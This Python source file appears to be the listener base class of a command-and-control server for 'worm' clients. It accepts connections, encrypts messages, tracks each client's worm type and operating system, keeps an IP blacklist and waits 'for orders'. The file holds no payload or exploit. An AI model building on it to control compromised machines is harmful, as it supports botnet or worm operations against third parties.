import socket
import selectors
import base64
import os
import threading
import json


from multiprocessing import Process, Pipe
from threading import Thread, Event
from time import sleep

from ..CONFIG import DEFAULT_IP, RAW_LEN, FORMAT_CODE, UNIX_SOCKET_RAW_LEN, UNIX_SOCKET_FORMAT_CODE, SOCKETS_DIR, LISTENING_STEP, EXTRAS_DIR, OUTPUT_DIR
from .tools import MrHandler, LocalAPI
from .controlers import BasicControler
from ..chameleon import Chameleon
from ..tools import Messenger
from .xtra_socket import ExtraSocket





class EmptyMSG:
    def __init__(self):
        self.name = "Messenger"
    
    def log(self, msg, level=None, end=None, dev=None):
        print(msg)
    
    def __call__(self, msg, level=None, end=None, dev=None):
        self.log(msg)


    



class BasicTemplate(Process):
    TYPES = None
    INFO = None
    ADD_CONF = {}
    WORM_TYPE = None
    WORM_INFO = ""
    def __init__(self, pipes, conf, stop_signal, controler=BasicControler, client_handler=MrHandler, msg_crypt=Chameleon, api=LocalAPI):
        super().__init__(daemon=True)
        self.name = conf.get("NAME")
        self._ip = conf.get("IP", DEFAULT_IP)
        self._port = int(conf.get("PORT"))
        self.raw_len = conf.get("RAW_LEN", RAW_LEN)
        self.format = conf.get("FORMAT_CODE", FORMAT_CODE)
        self._unix_raw_len = UNIX_SOCKET_RAW_LEN
        self._unix_format_code = UNIX_SOCKET_FORMAT_CODE
        self._listening_step = LISTENING_STEP
        self.sockets_dir = SOCKETS_DIR
        self.extras_dir = EXTRAS_DIR
        self.sys_msg = conf.get("SYS_MSG")
        self.unix_sockets = {}
        self.addr = (self._ip, self._port)
        self.pipe = pipes
        self.Msg = None
        self.cli_ID = 0
        self._stop_signal = stop_signal
        self.__crypter = msg_crypt
        self.__CTRL = controler
        self.__CliHand = client_handler
        self.__tmp_conf = conf
        self._listening_FLAG = Event()
        self.ctrl = None
        self.crypter = None
        self.CONN = {}
        self.blacklist = self.load_blacklist()
        self.lsock = None
        self.__API = api
        self.API = None


    @property
    def is_listening(self):
        if self._listening_FLAG.is_set():
            return True
        else:
            return False
    
    @property
    def conf(self):
        config = self.show_config()
        config["SYS_MSG"] = self.sys_msg
        return config
    
    
    def _check_startup(self):
        if not os.path.exists(self.sockets_dir):
            os.mkdir(self.sockets_dir)
        self.Msg = Messenger(self.name, self.__tmp_conf)
        self.crypter = self.__crypter(self.format)
        

########################### Server ########################################
    def _build_server(self, first_time=True):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except OSError as error:
            self.Msg(f"{self.name} Error when create socket: {error}", level=True)
            return False
        try:
            self.server.bind(self.addr)
        except OSError as error:
            self.Msg(f"{self.name} Error when bind socket: {error}", level=True)
            return False

        self.selector = selectors.DefaultSelector()
        self.selector.register(self.server, selectors.EVENT_READ)
        if first_time:
            self.ctrl = self.__CTRL(self.pipe, self)
            self.ctrl.start()
            self.API = self.__API(self.name, self)
            self.API.start()
            sleep(0.3)
            if self.API._status:
                self.Msg(f"\n[{self.name}] Local API works OK ")
            else:
                self.Msg(f"\n[{self.name}] [!!] ERROR Local API starts [!!]", level=True)
                return False     
        self.Msg(f"[{self.name}] I am Ready !!! ... waiting for orders", level=True)
        self._listening_FLAG.clear()
        return True
    
    def _rebuild_socket(self):
        if self._listening_FLAG.is_set():
            self.Msg(f"\n[{self.name}] ERROR: Cant rebuild socket. Is still active", level=True)
            return False
        else:
            if self._build_server(first_time=False):
                self.Msg(f"\n[{self.name}] Socket rebuild successfull", level=True)
                return True
    
    def _build_listening(self):
        if self.is_listening:
            self.Msg(f"[{self.name}] [!!] Server is already listening [!!]", level=True)
            return False
        try:
            self.server.listen()
            self.Msg(f"\n[{self.name}] SERVER LISTENING ... waiting for connections ....\n", level=True)
            self._listening_FLAG.set()
            return True
        except OSError as error:
            self.Msg(f"\n[{self.name}] Error. Server cant listen: {error}", level=True)
            return False
    
    def _listening(self):
        while self.is_listening:
            events = self.selector.select(timeout=self._listening_step)
            for key, mask in events:
                if key.fileobj is self.server:
                    self._accept_conn()
        self.Msg(f"\n[{self.name}] Stop Listening ....", level=True)
        self._close_all_conn()
        self.selector.unregister(self.server)
        self.server.shutdown(socket.SHUT_RDWR)
        self.server.close()
        self._rebuild_socket()
        return True

    
    def listening(self):
        if self.is_listening:
            self.Msg(f"[{self.name}] [!!] Server is already listening [!!]", level=True)
            return False   
        if not self._build_listening():
            return False
        listen = Thread(target=self._listening, daemon=True)
        listen.start()
    
    


######################## CONN #########################################

    def add_conn(self, conn, addr):
        self.cli_ID += 1
        self.CONN[str(self.cli_ID)] = self.__CliHand(str(self.cli_ID), conn, addr, self.crypter, self)
        return self.CONN[str(self.cli_ID)]
    
    def _accept_conn(self):
        conn, addr = self.server.accept()
        if addr[0] in self.blacklist:
            self.Msg(f"[{self.name}] IP: {addr[0]} is on the blacklist. DISCONNECT !!")
            conn.close()
            return False
        nc = self.add_conn(conn, addr)
        nc.start()
        self.Msg(f"\n[{self.name}] New Connection from: {nc.Addr}")
        self.accept_conn(nc)
    
    def accept_conn(self, handler):
        self.send_msg("WELCOME TO SERVER", handler)

    
    def _send_msg(self, msg, handler):
        if isinstance(handler, str):
            if handler == "ALL":
                for c in self.CONN.values():
                    c.send_msg(msg)
                return True
            cli = self.CONN.get(handler)
            if not cli:
                self.Msg(f"\n[{self.name}] [!!] Client does not connected [!!]")
                return False
            cli.send_msg(msg)
        else:
            handler.send_msg(msg)
    
    def send_msg(self, msg, cli_ID):
        self._send_msg(msg, cli_ID)
    
    def _close_all_conn(self):
        self.Msg("CLOSE ALL CONN")
        del self.CONN
        self.CONN = {}
    
    def _close_traget_conn(self, handler_id):
        try:
            del self.CONN[handler_id]
        except:
            pass
        return True

    def show_clients(self):
        self.Msg(f"\n[{self.name}] ************************ All Connections *******************************\n", end=False, level=True)
        self.Msg(f"\n--- ID ----- IP -------- PORT--------- WORM TYPE ---------------- OP SYSTEM -------------\n", level=True, end=False)
        for c in self.CONN.values():
            self.Msg(f"--- {c.ID} --- {c.Addr} ----- {c.types} --------- {c.sys_op} --\n", end=False, level=True)
        self.Msg("\n------------------------------------------------ End -----------------------------------------------\n")

####################BLACKLIST#############################
    def load_blacklist(self):
        return self.load_data_file("blacklist.txt")
    
    def add2blacklist(self, ip_addr):
        if ip_addr in self.blacklist:
            self.Msg(f"\n[{self.name}] [!!] Address is already in blacklist [!!]", level=True)
            return False
        else:
            self.blacklist.append(ip_addr)
            self.Msg(f"\n[{self.name}] Add <{ip_addr}> to blacklist", level=True)
    
    def remove_from_blacklist(self, ip_addr):
        try:
            self.blacklist.remove(ip_addr)
            self.Msg(f"\n[{self.name}] Remove <{ip_addr}> from blacklist", level=True)
        except ValueError:
            self.Msg(f"\n[{self.name}] [!!] ERROR: Addres is not in blacklist [!!]", level=True)
    
    def show_blacklist(self):
        if len(self.blacklist) < 1:
            self.Msg(f"\n[{self.name}] Blacklist is empty", level=True)
            return True
        msg = ""
        for b in self.blacklist:
            msg += f"\n{b}"
        self.Msg(f"[{self.name}] Blacklist: {msg}", level=True)


##################### LOCAL ################################
    def load_data_file(self, name):
        data = []
        with open(os.path.join(self.extras_dir, name), "r") as f:
            for line in f.readlines():
                if line.startswith("#") or line == "\n":
                    continue
                data.append(line.strip("\n"))
        return data
        
##################### COMMAND ####################################
    def unpack_sys(self, msg):
        ccmd = msg.split(self.sys_msg)
        cmd = []
        for c in ccmd:
            if c == "" or c == " ":
                continue
            cmd.append(c)
        return cmd

    def _exec_sys(self, msg, handler):
        cmd = self.unpack_sys(msg)
        self.Msg(f"_EXEC_SYS:{cmd}", dev=True)
        if cmd[0] == "emp":
            return True
        elif cmd[0] == "cli":
            handler.types = cmd[1]
            handler.sys_op = cmd[2]
            handler.sys_env = cmd[3]
            return True
        elif cmd[0] == "echo":
            self.Msg(f"\n[{self.name}][{handler.Addr}] {cmd[1]}\nsend echo response")
            handler.send_msg(cmd[1])
            return True
    
    def exec_sys(self, msg, handler):
        self._exec_sys(msg, handler)

######################################################################

    def _show_config(self):
        conf = {
            "NAME": self.name,
            "TYPES" : self.TYPES,
            "IP" : self._ip,
            "PORT" : self._port,
            "INFO" : self.INFO,
            "FORMAT_CODE" : self.format,
            "RAW_LEN" : self.raw_len,
            "IS_LISTENING" : self.is_listening,
            "TYPES" : self.TYPES,
            "INFO" : self.INFO,
            "WORM_TYPE" : self.WORM_TYPE
        }
        conf.update(self.ADD_CONF)
        return conf
    
    def show_config(self):
        return self._show_config()
    
    def help(self):
        return ""
    
    def run(self):
        self._check_startup()
        if self._build_server():
            while not self._stop_signal.is_set():
                sleep(2)
        self._listening_FLAG.clear()
        # sleep(self._listening_step)
        self.Msg(f"\n[{self.name}] Server Closed", level=True)
        




    


